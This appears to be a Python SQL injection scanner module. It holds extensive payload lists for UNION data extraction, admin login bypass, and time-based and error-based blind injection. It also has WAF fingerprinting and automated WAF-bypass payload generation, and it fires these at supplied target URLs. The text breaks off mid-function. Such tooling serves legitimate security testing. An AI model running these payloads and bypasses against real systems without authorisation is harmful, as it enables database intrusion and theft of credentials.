#!/usr/bin/env python3
"""
SQL Injection Testing Module
Tests for various SQL injection vulnerabilities
"""

import requests
import time
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import random
import string

# Import notification system
try:
    from .notification_system import notify_vulnerability
    NOTIFICATIONS_AVAILABLE = True
except ImportError:
    NOTIFICATIONS_AVAILABLE = False
    def notify_vulnerability(vuln_details):
        pass  # No-op if notifications not available

class SQLInjectionTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # SQL Injection Classification (as per provided diagram)
        self.sqli_types = {
            'in_band': ['error_based', 'union_based'],
            'inferential': ['boolean_based', 'time_based'],
            'out_of_band': ['dns_based', 'http_based'],
            'voice_based': ['audio_commands']  # Emerging attack vector
        }
        
        # Basic SQL injection payloads (enhanced with generic payloads)
        self.basic_payloads = [
            # Original basic payloads
            "'", '"', "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
            "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "') OR ('1'='1", "\") OR (\"1\"=\"1", "' OR 'x'='x",
            "\" OR \"x\"=\"x", "') OR ('x')=('x", "\") OR (\"x\")=(\"x",
            "' OR 1=1 LIMIT 1--", "' OR 1=1 ORDER BY 1--", "' UNION SELECT 1--",
            "' AND 1=1--", "' AND 1=2--", "1' AND '1'='1", "1' AND '1'='2"
        ]
        
        # Generic SQL injection payloads (from provided collection)
        self.generic_payloads = [
            # Basic injection characters
            "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "\\\\", ";",
            
            # Basic logical conditions
            "' or \"", "' OR '1", "' OR 1 -- -", '" OR "" = "', '" OR 1 = 1 -- -',
            "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x",
            
            # Null and comment variations
            "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2", "%00",
            
            # Concatenation and wildcards
            "+", "||", "%", "@variable", "@@variable",
            
            # Numeric injections
            "AND 1", "AND 0", "AND true", "AND false", "1-false", "1-true", "1*56", "-2",
            
            # ORDER BY enumeration
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+",
            
            # GROUP BY variations
            "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+",
            "' GROUP BY columnnames having 1=1 --",
            
            # UNION SELECT patterns
            "-1' UNION SELECT 1,2,3--+", "' UNION SELECT sum(columnname ) from tablename --",
            "-1 UNION SELECT 1 INTO @,@", "-1 UNION SELECT 1 INTO @,@,@",
            
            # Subquery conditions
            "1 AND (SELECT * FROM Users) = 1", "' AND MID(VERSION(),1,1) = '5';",
            "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --"
        ]
        
        # Comprehensive Error-Based SQL injection payloads (NEW - Professional Grade)
        self.error_based_payloads = [
            # Basic Boolean OR conditions
            " OR 1=1", " OR 1=0", " OR x=x", " OR x=y",
            " OR 1=1#", " OR 1=0#", " OR x=x#", " OR x=y#",
            " OR 1=1-- ", " OR 1=0-- ", " OR x=x-- ", " OR x=y-- ",
            
            # Advanced conditional OR with LIKE
            " OR 3409=3409 AND ('pytW' LIKE 'pytW",
            " OR 3409=3409 AND ('pytW' LIKE 'pytY",
            
            # HAVING clause exploitation
            " HAVING 1=1", " HAVING 1=0", " HAVING 1=1#", " HAVING 1=0#",
            " HAVING 1=1-- ", " HAVING 1=0-- ",
            
            # Basic Boolean AND conditions
            " AND 1=1", " AND 1=0", " AND 1=1-- ", " AND 1=0-- ",
            " AND 1=1#", " AND 1=0#", " AND 1=1 AND '%'='", " AND 1=0 AND '%'='",
            
            # Advanced numeric conditions
            " AND 1083=1083 AND (1427=1427", " AND 7506=9091 AND (5913=5913",
            " AND 1083=1083 AND ('1427=1427", " AND 7506=9091 AND ('5913=5913",
            
            # String comparison conditions
            " AND 7300=7300 AND 'pKlZ'='pKlZ", " AND 7300=7300 AND 'pKlZ'='pKlY",
            " AND 7300=7300 AND ('pKlZ'='pKlZ", " AND 7300=7300 AND ('pKlZ'='pKlY",
            
            # AS/WHERE clause injections
            " AS INJECTX WHERE 1=1 AND 1=1", " AS INJECTX WHERE 1=1 AND 1=0",
            " AS INJECTX WHERE 1=1 AND 1=1#", " AS INJECTX WHERE 1=1 AND 1=0#",
            " AS INJECTX WHERE 1=1 AND 1=1--", " AS INJECTX WHERE 1=1 AND 1=0--",
            " WHERE 1=1 AND 1=1", " WHERE 1=1 AND 1=0",
            " WHERE 1=1 AND 1=1#", " WHERE 1=1 AND 1=0#",
            " WHERE 1=1 AND 1=1--", " WHERE 1=1 AND 1=0--",
            
            # MySQL RLIKE exploitation
            " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
            " RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
            
            # Conditional IF statements
            "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
            "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
            
            # Percentage wildcard conditions
            "%' AND 8310=8310 AND '%'='",
            "%' AND 8310=8311 AND '%'='",
            
            # Database version fingerprinting (MySQL/MariaDB detection)
            " and (select substring(@@version,1,1))='X'",
            " and (select substring(@@version,1,1))='M'",
            " and (select substring(@@version,2,1))='i'",
            " and (select substring(@@version,2,1))='y'",
            " and (select substring(@@version,3,1))='c'",
            " and (select substring(@@version,3,1))='S'",
            " and (select substring(@@version,3,1))='X'"
        ]
        
        # ORDER BY column enumeration payloads (Comprehensive 1-30 + 31337)
        self.order_by_payloads = []
        
        # Generate ORDER BY payloads with different comment styles
        for i in range(1, 31):  # 1-30
            self.order_by_payloads.extend([
                f" ORDER BY {i}-- ",
                f" ORDER BY {i}# ",
                f" ORDER BY {i} "
            ])
        
        # Add the classic 31337 test
        self.order_by_payloads.extend([
            " ORDER BY 31337-- ",
            " ORDER BY 31337#",
            " ORDER BY 31337 "
        ])
        
        # Time-based blind SQL injection payloads (enhanced)
        self.time_based_payloads = [
            # MySQL time-based
            ",(select * from (select(sleep(10)))a)",
            "%2c(select%20*%20from%20(select(sleep(10)))a)",
            
            # MSSQL time-based
            "';WAITFOR DELAY '0:0:30'--",
            
            # Original advanced time-based payloads
            "'; WAITFOR DELAY '00:00:05'--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR pg_sleep(5)--", "'; SELECT pg_sleep(5)--"
        ]
        
        # Comment variations for bypass techniques
        self.comment_variations = [
            "#",        # Hash comment
            "/**/",     # C-style comment
            "-- -",     # SQL comment
            ";%00",     # Nullbyte
            "`"         # Backtick
        ]
        
        # Advanced payloads for moderate/extreme levels
        self.advanced_payloads = [
            # Time-based blind SQLi (Marx Chryz case study techniques)
            "'; WAITFOR DELAY '00:00:05'--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR pg_sleep(5)--", "'; SELECT pg_sleep(5)--",
            
            # Advanced Time-Based Blind SQLi (Working payload from case study)
            "(select*from(select(sleep(10)))a)", "(select*from(select(sleep(5)))a)",
            "(select*from(select(sleep(30)))a)", 
            "ORDER BY (select*from(select(sleep(10)))a)",
            "ORDER BY (select*from(select(sleep(5)))a)--",
            
            # MySQL benchmark function (alternative to sleep)
            "benchmark(1000000000,md5(1))", "benchmark(5000000,sha1(1))",
            "ORDER BY benchmark(1000000000,md5(1))--",
            
            # WAF bypass techniques for time-based
            "/**/sleep/**/(10)", "/*!50000sleep*/(10)", "sl/**/eep(10)",
            "SELE/**/CT/**/sle/**/ep(10)", "un/**/ion sel/**/ect sleep(10)",
            
            # MySQL Version Enumeration (Marx Chryz technique)
            "/*!50000someInvalidSQLSyntax*/", "/*!50731someInvalidSQLSyntax*/",
            "/*!50732someInvalidSQLSyntax*/", "/*!80000someInvalidSQLSyntax*/",
            "/*!40000someInvalidSQLSyntax*/", "/*!30000someInvalidSQLSyntax*/",
            
            # ORDER BY SQL Injection vectors (case study focus)
            "' ORDER BY 1--", "' ORDER BY 18--", "' ORDER BY 999--",
            "' ORDER BY (SELECT 1)--", "' ORDER BY (SELECT 1 UNION SELECT 2)--",
            "ORDER BY IF(1=1,1,(SELECT 1 UNION SELECT 2))--",
            "ORDER BY (CASE WHEN 1=1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
            
            # Comprehensive Boolean-based detection (from guide)
            "' AND 1=1--", "' AND 1=2--", "' OR 1=1--", "' OR 1=2--",
            "') AND ('1'='1", "') AND ('1'='2", "') OR ('1'='1", "') OR ('1'='2",
            "' AND 'x'='x", "' AND 'x'='y", "' OR 'x'='x", "' OR 'x'='y",
            
            # UNION-based data retrieval (from guide)
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT database(),user(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            
            # Application logic subversion (admin bypass)
            "administrator'--", "admin'--", "root'--", "sa'--",
            "' OR '1'='1'--", "' OR 'x'='x'--", "admin'/*", "administrator'/*",
            
            # Hidden data retrieval (comment injection)  
            "Gifts'--", "' OR 1=1--", "'+OR+1=1--", "' OR 'a'='a'--",
            
            # Union-based SQLi
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", "' UNION ALL SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT database(),user(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            
            # Boolean-based blind SQLi
            "' AND (SELECT SUBSTRING(user(),1,1)='r')--", "' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>114--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            
            # Error-based SQLi
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            
            # NoSQL injection
            "' || '1'=='1", "' && '1'=='1", "{\"$gt\":\"\"}", "{\"$ne\":null}",
            "'; return true; var x='", "'; return 1==1; var x='",
            
            # Second-order SQLi
            "admin'--", "admin'/*", "admin' OR '1'='1'/*", "admin' UNION SELECT 1,2,3--"
        ]
        
        # Database-specific payloads (comprehensive guide implementation)
        self.db_specific_payloads = {
            'mysql': [
                # Time delays
                "'; SELECT SLEEP(5)--", "' AND SLEEP(5)--", "SELECT SLEEP(10)",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "SELECT IF(1=1,SLEEP(10),'a')",
                
                # Version detection
                "' UNION SELECT @@version--", "SELECT @@version",
                
                # Data retrieval
                "' UNION SELECT 1,2,3,version(),database(),user()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                
                # Error-based
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))"
            ],
            'postgresql': [
                # Time delays
                "'; SELECT pg_sleep(5)--", "' OR pg_sleep(5)--", "SELECT pg_sleep(10)",
                "SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END",
                
                # Version detection & Data retrieval
                "' UNION SELECT 1,2,3,version(),current_database(),current_user--",
                "SELECT * FROM information_schema.tables",
                
                # Error-based
                "' AND CAST((SELECT version()) AS int)--",
                "SELECT CAST((SELECT password FROM users LIMIT 1) AS int)"
            ],
            'oracle': [
                # Time delays
                "' AND (SELECT COUNT(*) FROM dual WHERE ROWNUM<=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',10) IS NULL)--",
                "SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual",
                
                # Version detection & Data retrieval
                "SELECT banner FROM v$version", "SELECT * FROM all_tables",
                "' UNION SELECT 1,2,3,banner FROM v$version--",
                
                # Error-based
                "SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual"
            ],
            'mssql': [
                # Time delays  
                "'; WAITFOR DELAY '00:00:05'--", "IF (1=1) WAITFOR DELAY '0:0:10'",
                
                # Version detection & Data retrieval
                "SELECT @@version", "' UNION SELECT 1,2,3,@@version,DB_NAME(),USER_NAME()--",
                "SELECT * FROM information_schema.tables",
                
                # Error-based
                "SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END"
            ]
        }
        
        # Error patterns that indicate SQL injection
        self.error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
            r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*pg_.*",
            r"valid PostgreSQL result", r"Npgsql\.", r"Oracle error",
            r"Oracle.*Driver", r"Warning.*oci_.*", r"Microsoft.*ODBC.*SQL Server",
            r"SQLServer JDBC Driver", r"SqlException", r"OLE DB.*SQL Server",
            r"Unclosed quotation mark after", r"quoted string not properly terminated",
            r"Microsoft JET Database Engine", r"Access Database Engine",
            r"SQLite.*error", r"sqlite3.OperationalError", r"SQLiteException",
            r"Syntax error.*query expression", r"Data type mismatch",
            r"could not prepare statement", r"unknown column", r"ambiguous column name",
            r"Invalid column name", r"Column.*doesn't exist", r"Table.*doesn't exist",
            r"Division by zero", r"Arithmetic overflow error", r"Conversion failed"
        ]
    
    def test_parameter(self, url, param, value, method='GET', waf_detected=None):
        """Test a specific parameter for SQL injection with WAF bypass support"""
        results = []
        
        payloads_to_test = self.basic_payloads.copy()
        
        # Add generic payloads for all levels (comprehensive coverage)
        payloads_to_test.extend(self.generic_payloads)
        
        # Add comprehensive error-based payloads (NEW - Professional Grade)
        payloads_to_test.extend(self.error_based_payloads)
        
        if self.level in ['moderate', 'extreme']:
            payloads_to_test.extend(self.advanced_payloads)
            # Add time-based payloads for intensive testing
            payloads_to_test.extend(self.time_based_payloads)
            # Add ORDER BY enumeration payloads for column detection
            payloads_to_test.extend(self.order_by_payloads)
        
        for payload in payloads_to_test:
            # Test original payload first
            test_payloads = [payload]
            
            # If WAF detected or extreme level, add bypass payloads (Marx Chryz approach)
            if waf_detected or self.level == 'extreme':
                bypass_payloads = self.get_waf_bypass_payloads(payload, waf_detected)
                test_payloads.extend(bypass_payloads[:5])  # Limit to first 5 bypass attempts per payload
            
            for test_payload in test_payloads:
                try:
                    # Prepare the test data
                    if method.upper() == 'GET':
                        test_params = {param: test_payload}
                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                    else:
                        test_data = {param: test_payload}
                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                    
                    # Check for SQL errors in response
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'url': url,
                                'parameter': param,
                                'payload': test_payload,
                                'method': method,
                                'evidence': f"SQL error pattern found: {pattern}",
                                'response_length': len(response.text),
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            notify_vulnerability(vuln)  # Real-time notification
                            print(f"{Fore.RED}[!] SQL Injection found: {url} (param: {param}){Style.RESET_ALL}")
                            break
                
                    # Time-based detection for sleep payloads
                    if any(sleep_keyword in test_payload.lower() for sleep_keyword in ['sleep', 'waitfor', 'pg_sleep']):
                        start_time = time.time()
                        if method.upper() == 'GET':
                            test_params = {param: test_payload}
                            response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                        else:
                            test_data = {param: test_payload}
                            response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                        
                        response_time = time.time() - start_time
                        
                        if response_time >= 4:  # If response takes 4+ seconds for a 5-second delay
                            vuln = {
                                'type': 'Time-based Blind SQL Injection',
                                'severity': 'High',
                                'url': url,
                                'parameter': param,
                                'payload': test_payload,
                                'method': method,
                                'evidence': f"Response delay: {response_time:.2f} seconds",
                                'response_time': response_time,
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            notify_vulnerability(vuln)  # Real-time notification
                            print(f"{Fore.RED}[!] Time-based SQL Injection found: {url} (param: {param}){Style.RESET_ALL}")
                    
                        # Small delay to avoid overwhelming the server
                        time.sleep(0.1)
                        
                except requests.exceptions.Timeout:
                    # Timeout might indicate time-based SQL injection
                    if any(sleep_keyword in test_payload.lower() for sleep_keyword in ['sleep', 'waitfor', 'pg_sleep']):
                        vuln = {
                            'type': 'Time-based Blind SQL Injection (Timeout)',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': param,
                            'payload': test_payload,
                            'method': method,
                            'evidence': "Request timed out, possible time-based SQLi",
                            'response_time': self.timeout
                        }
                        results.append(vuln)
                        print(f"{Fore.YELLOW}[!] Possible Time-based SQL Injection (timeout): {url}{Style.RESET_ALL}")
                except Exception:
                    continue
        
        return results
    
    def get_waf_bypass_payloads(self, original_payload, waf_type=None):
        """Generate WAF bypass variations for SQL injection payloads (Marx Chryz techniques)"""
        bypass_payloads = []
        
        # Comment-based bypasses
        bypass_payloads.extend([
            original_payload.replace(' ', '/***/'),
            original_payload.replace(' ', '/**/'),
            original_payload.replace('SELECT', 'SE/**/LECT'),
            original_payload.replace('UNION', 'UN/**/ION'),
            original_payload.replace('sleep', 'sl/**/eep'),
            original_payload.replace('benchmark', 'bench/**/mark'),
        ])
        
        # Case variation bypasses
        bypass_payloads.extend([
            original_payload.upper(),
            original_payload.lower(),
            ''.join(char.upper() if i % 2 == 0 else char.lower() 
                   for i, char in enumerate(original_payload)),
        ])
        
        # Encoding bypasses
        try:
            import urllib.parse
            bypass_payloads.extend([
                urllib.parse.quote(original_payload),
                urllib.parse.quote_plus(original_payload),
                ''.join(f'%{ord(c):02x}' for c in original_payload),  # Full URL encoding
            ])
        except:
            pass
        
        # MySQL version-specific comment bypasses (Marx Chryz technique)
        if 'sleep' in original_payload.lower():
            bypass_payloads.extend([
                original_payload.replace('sleep', '/*!50000sleep*/'),
                original_payload.replace('sleep', '/*!50731sleep*/'),
                f'/*!50000{original_payload}*/',
            ])
        
        # Alternative function bypasses (when sleep/benchmark blocked)
        if 'sleep' in original_payload.lower():
            # Marx Chryz working payload pattern
            sleep_time = '10'
            if '(' in original_payload and ')' in original_payload:
                # Extract sleep time if present
                import re
                match = re.search(r'sleep\((\d+)\)', original_payload.lower())
                if match:
                    sleep_time = match.group(1)
            
            bypass_payloads.extend([
                f'(select*from(select(sleep({sleep_time})))a)',  # Working payload from case study
                f'(select(sleep({sleep_time})))',
                f'(SELECT SLEEP({sleep_time}))',
                f'SELECT BENCHMARK(1000000,MD5(1))',
                f'SELECT BENCHMARK(5000000,SHA1(1))',
            ])
        
        # Character substitution bypasses
        char_subs = {
            ' ': ['+', '%20', '/**/', '%0a', '%0d', '%0c', '%09'],
            '=': ['%3d', 'LIKE', 'REGEXP', 'IN'],
            "'": ['%27', '0x27', 'CHAR(39)'],
            '"': ['%22', '0x22', 'CHAR(34)'],
            '(': ['%28'],
            ')': ['%29'],
        }
        
        for char, substitutes in char_subs.items():
            for substitute in substitutes:
                if char in original_payload:
                    bypass_payloads.append(original_payload.replace(char, substitute))
        
        # Remove duplicates and return
        return list(set([p for p in bypass_payloads if p != original_payload]))
    
    def detect_waf(self, url):
        """Detect Web Application Firewall"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amz-cf-id', 'x-amz-request-id'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Imperva': ['x-iinfo'],
            'F5 BIG-IP': ['f5-bigip', 'x-wa-info'],
            'Barracuda': ['barra'],
            'Citrix NetScaler': ['ns_af', 'citrix_ns_id'],
            'Fortinet FortiWeb': ['fortigate', 'fortiweb'],
        }
        
        try:
            # Test with a simple SQLi payload
            response = requests.get(f"{url}?test=' OR 1=1--", timeout=self.timeout, verify=False)
            
            # Check headers for WAF signatures
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if any(sig.lower() in str(header).lower() for header in response.headers.values()):
                        return waf_name
            
            # Check response content for WAF blocks
            waf_content_patterns = [
                'access denied', 'blocked', 'security violation', 'unauthorized',
                'forbidden', 'not allowed', 'rejected', 'filtered'
            ]
            
            for pattern in waf_content_patterns:
                if pattern in response.text.lower() and response.status_code in [403, 406, 429, 501, 503]:
                    return "Unknown WAF"
            
        except Exception:
            pass
        
        return None
    
    def test_sql_injection(self, targets):
        """Main SQL injection testing function"""
        print(f"{Fore.YELLOW}[*] Starting SQL Injection testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        for target in targets:
            url = target.get('url', target.get('subdomain', ''))
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing: {url}{Style.RESET_ALL}")
            
            # Detect WAF
            waf = self.detect_waf(url)
            if waf:
                print(f"{Fore.YELLOW}[!] WAF Detected: {waf}{Style.RESET_ALL}")
            
            # Common parameters to test (enhanced with ORDER BY case study findings)
            common_params = ['id', 'user', 'username', 'email', 'search', 'q', 'query', 
                           'category', 'cat', 'page', 'limit', 'offset', 'sort', 'order',
                           'product', 'item', 'article', 'news', 'post', 'comment',
                           'login', 'password', 'pass', 'token', 'session', 'key']
            
            # ORDER BY specific parameters (Marx Chryz case study focus)
            order_by_params = ['order', 'sort', 'orderby', 'sortby', 'ordering', 'direction',
                             'order_by', 'sort_by', 'order_field', 'sort_field', 'sort_column',
                             'order_column', 'field', 'column', 'by', 'desc', 'asc']
            
            # Test common parameters with comprehensive SQLi detection
            for param in common_params:
                if self.level == 'extreme' or len(all_vulnerabilities) < 5:  # Limit testing for performance
                    # Original parameter testing
                    vulns = self.test_parameter(url, param, 'test', 'GET', waf)
                    all_vulnerabilities.extend(vulns)
                    
                    # NEW: Comprehensive SQLi type testing (as per provided classification)
                    if self.level in ['moderate', 'extreme']:
                        comprehensive_vulns = self.test_comprehensive_sqli_types(url, param, 'GET')
                        all_vulnerabilities.extend(comprehensive_vulns)
                    
                    # Also test POST method for some parameters
                    if param in ['login', 'username', 'password', 'search']:
                        vulns = self.test_parameter(url, param, 'test', 'POST', waf)
                        all_vulnerabilities.extend(vulns)
                        
                        # Comprehensive POST testing for critical parameters
                        if self.level == 'extreme':
                            comprehensive_vulns = self.test_comprehensive_sqli_types(url, param, 'POST')
                            all_vulnerabilities.extend(comprehensive_vulns)
            
            # Enhanced ORDER BY SQL Injection testing (Marx Chryz case study technique)
            print(f"{Fore.CYAN}[*] Testing ORDER BY SQL Injection vectors...{Style.RESET_ALL}")
            for order_param in order_by_params:
                if self.level in ['moderate', 'extreme']:
                    order_vulns = self.test_order_by_injection(url, order_param)
                    all_vulnerabilities.extend(order_vulns)
            
            # Comprehensive database fingerprinting (from guide)
            if self.level in ['moderate', 'extreme']:
                print(f"{Fore.CYAN}[*] Starting comprehensive database fingerprinting...{Style.RESET_ALL}")
                db_vulns = self.comprehensive_database_fingerprinting(url)
                all_vulnerabilities.extend(db_vulns)
            
            # MySQL Version enumeration testing (case study technique)
            if self.level == 'extreme':
                print(f"{Fore.CYAN}[*] Testing MySQL version enumeration...{Style.RESET_ALL}")
                version_vulns = self.test_mysql_version_enum(url)
                all_vulnerabilities.extend(version_vulns)
            
            # Database content examination (UNION-based information disclosure)
            if self.level in ['moderate', 'extreme'] and any('SQL' in str(vuln) for vuln in all_vulnerabilities):
                print(f"{Fore.CYAN}[*] SQL injection detected - examining database contents...{Style.RESET_ALL}")
                # Test common vulnerable parameters for database examination
                for param in ['id', 'user', 'search', 'category']:
                    exam_vulns = self.examine_database_contents(url, param, 'GET')
                    all_vulnerabilities.extend(exam_vulns)
                    if exam_vulns:  # If successful, no need to test more parameters
                        break
            
            # UNION-based SQL injection testing (moderate/extreme levels)
            if self.level in ['moderate', 'extreme']:
                print(f"{Fore.CYAN}[*] Testing UNION-based SQL Injection...{Style.RESET_ALL}")
                # Test common vulnerable parameters for UNION attacks
                for param in ['id', 'user', 'search', 'category', 'product']:
                    union_vulns = self.test_union_based_sqli(url, param, 'GET')
                    all_vulnerabilities.extend(union_vulns)
                    if union_vulns:  # If UNION injection found, focus on exploitation
                        break
            
            # Comprehensive Blind SQL injection testing (all levels)
            print(f"{Fore.CYAN}[*] Testing Blind SQL Injection techniques...{Style.RESET_ALL}")
            for param in ['id', 'user', 'trackingid', 'sessionid', 'search']:
                blind_vulns = self.test_blind_sqli_comprehensive(url, param, 'GET')
                all_vulnerabilities.extend(blind_vulns)
                if blind_vulns:  # If blind SQLi found, focus on exploitation
                    break
            
            # Second-order SQL injection testing (extreme level only due to complexity)
            if self.level == 'extreme':
                print(f"{Fore.CYAN}[*] Testing Second-Order SQL Injection...{Style.RESET_ALL}")
                second_order_vulns = self.test_second_order_sqli(url)
                all_vulnerabilities.extend(second_order_vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities
    
    def test_order_by_injection(self, url, param):
        """Test ORDER BY SQL Injection (Marx Chryz case study technique)"""
        results = []
        
        # ORDER BY specific payloads from the case study
        order_by_payloads = [
            # Basic ORDER BY injection test
            "type'", "1'", "id'", "name'",
            
            # Time-based ORDER BY injection (working payload from case study)
            "(select*from(select(sleep(10)))a)",
            "(select*from(select(sleep(5)))a)",
            "(select*from(select(sleep(30)))a)",
            
            # Error-based ORDER BY injection
            "(SELECT 1 UNION SELECT 2)",
            "(SELECT * FROM (SELECT 1 UNION SELECT 2)a)",
            
            # Boolean-based ORDER BY injection
            "IF(1=1,1,(SELECT 1 UNION SELECT 2))",
            "IF(1=2,1,(SELECT 1 UNION SELECT 2))",
            "(CASE WHEN 1=1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
            
            # MySQL version-specific payloads
            "/*!50000someInvalidSQLSyntax*/",
            "/*!50731someInvalidSQLSyntax*/",
            
            # ORDER BY column number testing
            "1", "2", "3", "18", "999"
        ]
        
        print(f"{Fore.CYAN}[*] Testing ORDER BY parameter: {param}{Style.RESET_ALL}")
        
        for payload in order_by_payloads:
            try:
                # Test with different parameter combinations (case study: ?order=type&ordering=ASC)
                test_params = {
                    param: payload,
                    'ordering': 'ASC',  # Common companion parameter
                    'search': ''        # Often present in the same request
                }
                
                start_time = time.time()
                response = requests.get(url, params=test_params, timeout=self.timeout + 15, verify=False)
                end_time = time.time()
                response_time = end_time - start_time
                
                # Time-based detection (Marx Chryz technique)
                if any(sleep_keyword in payload.lower() for sleep_keyword in ['sleep', 'benchmark']):
                    if response_time >= 5:  # Payload should cause delay
                        vuln = {
                            'type': 'Time-based Blind SQL Injection in ORDER BY',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Response time: {response_time:.2f} seconds (expected delay)',
                            'attack_vector': 'ORDER BY clause SQL injection with time delay',
                            'impact': 'Database information disclosure, potential data exfiltration',
                            'case_study': 'Marx Chryz bug bounty - Time-Based Blind SQL Injection',
                            'remediation': 'Use parameterized queries, validate ORDER BY parameters',
                            'status_code': response.status_code,
                            'response_time': response_time
                        }
                        results.append(vuln)
                        notify_vulnerability(vuln)  # Real-time notification
                        print(f"{Fore.RED}[!] CRITICAL: Time-based ORDER BY SQLi: {url} (param: {param}) - {response_time:.2f}s{Style.RESET_ALL}")
                
                # Error-based detection
                if response.status_code == 500:
                    # Check for specific error patterns
                    error_indicators = [
                        'subquery returns more than 1 row',
                        'operand should contain 1 column',
                        'unknown column',
                        'mysql error',
                        'sql syntax'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vuln = {
                            'type': 'Error-based SQL Injection in ORDER BY',
                            'severity': 'High',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'HTTP 500 error with SQL error indicators',
                            'attack_vector': 'ORDER BY clause error-based SQL injection',
                            'impact': 'Database structure disclosure, error message leakage',
                            'case_study': 'Marx Chryz technique - Error 500 detection method',
                            'remediation': 'Implement proper error handling, use parameterized queries',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.YELLOW}[!] Error-based ORDER BY SQLi: {url} (param: {param}){Style.RESET_ALL}")
                    
                    # Simple error 500 on single quote (basic test from case study)
                    elif payload.endswith("'") and response.status_code == 500:
                        vuln = {
                            'type': 'SQL Injection in ORDER BY (Error 500)',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'HTTP 500 error on single quote injection',
                            'attack_vector': 'Basic ORDER BY SQL syntax error',
                            'impact': 'Potential SQL injection vulnerability indication',
                            'case_study': 'Marx Chryz initial discovery - Single quote error 500',
                            'remediation': 'Validate and sanitize ORDER BY parameters',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.CYAN}[!] Basic ORDER BY SQLi indication: {url} (param: {param}){Style.RESET_ALL}")
                        
            except requests.exceptions.Timeout:
                # Timeout on sleep payload indicates successful time-based injection
                if any(sleep_keyword in payload.lower() for sleep_keyword in ['sleep', 'benchmark']):
                    vuln = {
                        'type': 'Time-based Blind SQL Injection in ORDER BY (Timeout)',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
